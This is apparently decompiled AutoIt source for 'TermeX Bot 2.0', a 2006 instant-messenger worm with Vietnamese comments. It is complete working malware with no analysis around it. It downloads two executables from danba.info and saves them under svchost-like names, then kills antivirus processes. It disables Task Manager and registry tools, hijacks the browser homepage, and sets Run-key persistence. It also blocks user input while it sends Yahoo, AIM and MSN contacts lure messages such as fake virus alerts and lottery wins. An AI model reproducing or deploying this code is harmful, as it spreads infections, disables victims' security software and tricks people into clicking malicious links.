; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\My Documents\Viet8x\link-en.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------
; Tac Gia: TermeX - ThanatoS
; Phan Mem: TermeX Bot
; Phien Ban: 2.0
; Cong Dung: Quang cao Website thong qua Y!M,MSN,AIM,My Computer
; Phat Hanh: 20-9-2006
;---------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://tintucso.com/luke/"
$link = "http://tintucso.com/luke/"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\system\svchost32.exe") Then
 		InetGet ("http://danba.info/y5world/link-en.exe", @WindowsDir & "\system\svchost32.exe", 0, 1)
 		Sleep(5000)
	EndIf

If Not FileExists(@WindowsDir & "\system\svhost.exe") Then
 		InetGet ("http://danba.info/y5world/en.exe", @WindowsDir & "\system\svhost.exe", 0, 1)
 		Sleep(5000)
	EndIf

;Kill cac processes Anti-Virus
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

If ProcessExists("svhost32.exe") Then
   ProcessClose("svhost32.exe")
EndIf

If ProcessExists("svchost32.exe") Then
   ProcessClose("svchost32.exe")
EndIf

If ProcessExists("bdss.exe") Then
   ProcessClose("bdss.exe")
   ProcessClose("vsserv.exe")
EndIf

;Click vao Google adsense
;$title = WinGetTitle("About Malignant Mesothelioma - Microsoft Internet Explorer", "")
;$check = WinExists ($title)
;If $check = 1 Then
	;BlockInput (1)
	;WinActivate($title)
	;WinSetState ( $title , "", @SW_MAXIMIZE)
	;$pos = MouseGetPos()
	;MouseClick("left", 400, 300, 1, 0)
	;MouseMove ( $pos[0], $pos[1] , 0)
	;BlockInput (0)
;EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\system\svchost32.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\system\svhost.exe")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[12]
$tin[0] = "=)) can u tell me what he will do next ? :)) " & $link & "funny =)) "
$tin[1] = "$-) making money online never be easier with this tip: " & $link & "moneytips <:-P "
$tin[2] = "The end for girls who follow the famous footballer: " & $link & "football_news :( :( "
$tin[3] = "the only way to clean some online viruses that may lead you into troubles :" & $link & "AntiVirus << "
$tin[4] = "Update your Windows right now to avoid lots of critical online viruses. Click here to know how to Update your Windows without a license key B-): " & $link & "update_trick"
$tin[5] = "A new dangerous computer virus that can destroys all your data has just been released. Click here to know how to avoid it : " & $link & "Defender << "
$tin[6] = "oh my god , i've won a 20000 usd lottery :O " & $link & "?id=winning_list << "
$tin[7] = "you are virus infected . Use this tool to remove viruses from your PC : " & $link & "Antivirus C00l !!! "
$tin[8] = ":( hix, may be this's my mistake, but the link you gave me was unavaiable when I visited it:" & $link & "Storm << "
$tin[9] = "Just check out my new personal website : " & $link & "myblog  b-( << "
$tin[10] = "the lastest picture of our upcoming Miss World 2006: " & $link & "MissWorld !!  "
$tin[11] = "plz check this link for me : " & $link & "myblog . Why I cannot surf this site ??? "

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(20000)
$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)

	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
Sleep(400000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\My Documents\Viet8x\link-en.au3>
; ----------------------------------------------------------------------------

